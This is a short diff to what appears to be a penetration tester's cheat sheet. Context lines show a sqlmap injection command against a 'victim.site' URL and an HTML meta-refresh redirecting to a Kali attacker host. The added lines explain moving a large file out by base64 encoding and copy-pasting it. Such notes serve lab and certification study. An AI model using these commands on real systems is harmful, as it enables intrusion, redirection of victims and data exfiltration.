@@ -934,4 +934,11 @@ sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
 ```
 <meta http-equiv="refresh" content="0; url=http://KaliIP:8080/" />
 ```
+## Giant file transfer, can't transfer over network
+```
+base64 file
+highlight beginning, hit enter to copy to bottom, ctrl+c, paste
+base64 -d pasted file
+md5sum both to ensure accurate completion
+```
 ## How to replicate to gain access again:
